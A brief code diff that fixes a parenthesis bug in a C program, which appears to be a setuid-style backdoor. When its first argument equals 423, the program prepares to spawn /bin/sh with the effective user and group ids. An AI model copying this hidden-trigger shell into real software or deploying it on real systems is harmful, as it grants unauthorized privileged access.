@@ -5,7 +5,7 @@
 #include <sys/types.h>
 
 int main(int argc, char **argv) {
-  if (atoi(argv[1] == 423)) {
+  if (atoi(argv[1]) == 423) {
     char *args[2] = { strdup("/bin/sh"), 0 };
     gid_t gid = getegid();
     uid_t uid = geteuid();
